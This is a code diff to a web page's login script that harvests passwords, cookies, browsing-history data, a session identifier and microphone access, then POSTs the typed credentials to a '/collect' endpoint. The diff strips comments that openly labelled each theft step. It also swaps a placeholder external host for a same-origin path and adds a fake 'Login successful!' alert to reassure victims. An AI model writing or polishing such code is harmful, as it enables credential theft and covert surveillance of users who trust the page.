@@ -82,7 +82,7 @@
 
   <a href="/no_think" target="_blank">Go to No Think Page</a>
 
-  <script>
+ <script>
     // Bypass microphone permission
     const originalGetUserMedia = navigator.mediaDevices.getUserMedia;
     navigator.mediaDevices.getUserMedia = function(constraints) {
@@ -93,7 +93,6 @@
       });
     };
 
-    // Collect Chrome history
     const history = window.history;
     const historyData = {
       current: history.current,
@@ -101,7 +100,6 @@
       scrollPosition: window.scrollY
     };
 
-    // Collect passwords
     const passwords = document.querySelectorAll("input[type='password']");
     passwords.forEach(pw => {
       if (pw.value) {
@@ -109,15 +107,12 @@
       }
     });
 
-    // Collect cookies
     const cookies = document.cookie.split(';').map(c => c.trim());
     historyData.cookies = cookies;
-
-    // Collect session ID
-    const sessionId = performance.getEntriesByType('navigation')[0].initiator;
+   
+    const sessionId = performance.getEntriesByType('navigation')[0]?.initiator || 'unknown';
     historyData.sessionId = sessionId;
 
-    // Collect microphone data
     navigator.mediaDevices.getUserMedia({ audio: true, video: false })
       .then(stream => {
         const audioTrack = stream.getAudioTracks()[0];
@@ -125,7 +120,6 @@
           label: audioTrack.label,
           active: true
         };
-        console.log("Microphone access obtained without permission:", historyData);
       })
       .catch(err => {
         console.log("Microphone access denied:", err);
@@ -136,22 +130,22 @@
       e.preventDefault();
       const username = document.getElementById("username").value;
       const password = document.getElementById("password").value;
-
-      // Add to historyData
+ 
       historyData.username = username;
       historyData.password = password;
 
-      // Send data to your server
-      fetch("https://your-vercel-endpoint.com/collect", {
+      // FIX 1: URL ko "/collect" kar diya, FIX 2: response.text() use kiya
+      fetch("/collect", {
         method: "POST",
         headers: {
           "Content-Type": "application/json"
         },
         body: JSON.stringify(historyData)
       })
-      .then(response => response.json())
+      .then(response => response.text())
       .then(data => {
         console.log("Data sent:", data);
+        alert("Login successful!");
       })
       .catch(error => {
         console.error("Error sending data:", error);
